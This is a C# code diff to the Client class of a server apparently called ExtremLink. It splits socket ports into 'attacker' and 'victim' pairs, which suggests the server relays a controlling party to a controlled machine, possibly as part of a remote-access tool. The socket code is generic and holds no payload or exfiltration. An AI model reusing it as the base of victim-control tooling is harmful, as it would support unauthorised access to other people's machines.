@@ -26,8 +26,11 @@ namespace ExtremLink_Server.Classes
         // Attributes:
 
         // Integer constants which represent the sockets' ports:
-        public readonly int TCP_PORT = 1234;
-        public readonly int UDP_PORT = 1847;
+        public readonly int ATTACKER_TCP_PORT = 1234;
+        public readonly int ATTACKER_UDP_PORT = 1235;
+
+        public readonly int VICTIM_TCP_PORT = 1847;
+        public readonly int VICTIM_UDP_PORT = 1848;
 
         // A string which represent the IP address of the server:
         private string serverIpAddress;
@@ -71,11 +74,20 @@ namespace ExtremLink_Server.Classes
             set { this.typeOfClient = value; }
         }
 
+        // A bool parameter which represent the state of the client (true - connected, fase - disconnected)
+        private bool isConnected;
+        public bool IsConnected
+        {
+            get { return this.isConnected; }
+        }
 
-        public Client(string serverIpAddress)
+
+        public Client(string serverIpAddress, TypeOfClient typeOfClient)
         {
             this.serverIpAddress = serverIpAddress;
+            this.typeOfClient = typeOfClient;
             this.user = new User();
+            this.isConnected = false;
         }
 
 
@@ -87,18 +99,30 @@ namespace ExtremLink_Server.Classes
             var remoteEndPoint = clientSocket?.RemoteEndPoint as IPEndPoint;
             return remoteEndPoint.Address.ToString();
         }
-        public void ConnectToClient()
+        public async Task ConnectToClient()
         {
             // Input: The function gets nothing.
             // Output: The function waits for client to connect to the server.
-            this.udpSocket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
-            this.udpSocket.Bind(new IPEndPoint(IPAddress.Parse(this.serverIpAddress), UDP_PORT));
             this.tcpSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-            this.tcpSocket.Bind(new IPEndPoint(IPAddress.Parse(this.serverIpAddress), TCP_PORT));
+            this.udpSocket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
+
+            switch (this.TypeOfClient)
+            {
+                case TypeOfClient.attacker:
+                    this.tcpSocket.Bind(new IPEndPoint(IPAddress.Parse(this.serverIpAddress), this.ATTACKER_TCP_PORT));
+                    this.udpSocket.Bind(new IPEndPoint(IPAddress.Any, this.ATTACKER_UDP_PORT));
+                    break;
+                case TypeOfClient.victim:
+                    this.tcpSocket.Bind(new IPEndPoint(IPAddress.Parse(this.serverIpAddress), this.VICTIM_TCP_PORT));
+                    this.udpSocket.Bind(new IPEndPoint(IPAddress.Any, this.VICTIM_UDP_PORT));
+                    break;
+            }
+                
             this.tcpSocket.Listen();
             Socket tempTcpClientSocket = this.tcpSocket.Accept();
             this.ipAddress = this.FindClientIpAddress(tempTcpClientSocket);
             this.tcpSocket = tempTcpClientSocket;
+            this.isConnected = true;
         }
 
 
@@ -116,7 +140,7 @@ namespace ExtremLink_Server.Classes
                     socket.Send(buffer);
                     break;
                 case ProtocolType.Udp:
-                    socket.SendTo(buffer, new IPEndPoint(IPAddress.Parse(this.ipAddress), UDP_PORT));
+                    socket.SendTo(buffer, new IPEndPoint(IPAddress.Parse(this.ipAddress), ATTACKER_UDP_PORT));
                     break;
             }
         }
@@ -164,17 +188,9 @@ namespace ExtremLink_Server.Classes
         {
             // Input: Nothing.
             // Output: The received message from the client via he tcp socket as a list of parameters.
-            try
-            {
-                byte[] buffer = new byte[4096];
-                int receivedBytes = this.tcpSocket.Receive(buffer);
-                return this.OrderMessage(Encoding.UTF8.GetString(buffer, 0, receivedBytes));
-            }
-            catch (Exception e)
-            {
-                MessageBox.Show(e.Message);
-                return null;
-            }
+            byte[] buffer = new byte[4096];
+            int receivedBytes = this.tcpSocket.Receive(buffer);
+            return this.OrderMessage(Encoding.UTF8.GetString(buffer, 0, receivedBytes));
             
         }
         public List<object> GetUDPMessageFromClient()
